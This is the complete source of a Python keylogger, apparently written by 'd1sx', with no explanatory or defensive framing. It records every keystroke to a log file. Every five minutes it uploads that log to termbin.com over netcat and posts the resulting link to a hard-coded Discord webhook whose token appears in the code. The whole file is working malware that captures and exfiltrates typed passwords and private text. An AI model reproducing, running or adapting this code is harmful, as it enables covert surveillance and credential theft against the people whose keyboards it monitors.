#!/bin/python3

from pynput.keyboard import Listener
from discord_webhook import DiscordWebhook
import re, threading, os
from time import sleep

keys = []; ksksks = ['Key.right', 'Key.down', 'Key.left', 'Key.esc', 'Key.caps_lock', 'Key.alt', 'Key.up', 'Key.ctrl', 'Key.shift', 'Key.tab']
print('Captura de teclas iniciada!')

def send():
    os.system('echo "Started [Ok]" > log.txt');last='null'
    while True:
        file = open('log.txt', 'r'); data = file.read(); file.close(); link = os.popen('cat log.txt|nc termbin.com 9999').read()
        if data != last:
            webhook = DiscordWebhook(url='https://discord.com/api/webhooks/1041408257090134066/brLkBFFgAMX-wGoPYYUaAyRog3-v5HywW1ZA8ffJdW40I3iXwhf9qklYBxHsBTsKPWGN', content=link); response = webhook.execute(); sleep(300)
            last = data

def cap(key):
    key = str(key); key = re.sub(r'\'', '', key)
    key = re.sub(r'Key.enter', '\n[Enter]\n', key)
    key = re.sub(r'Key.backspace', '[ backspace ]', key)
    for l in ksksks:
        key = re.sub(l, '', key)
    key = re.sub(r'Key.space', ' ', key); keys.append(key)
    if key == '\n[Enter]\n':
        for i in keys:
            pass #print(i, end='')
        keys.clear()
    with open("log.txt", "a") as log:
        log.write(key)

x=threading.Thread(target=send, args=()).start()
with Listener(on_press=cap) as l:
    l.join()

###################
# author: d1sx    #
# date: 27/8/2021 #
###################
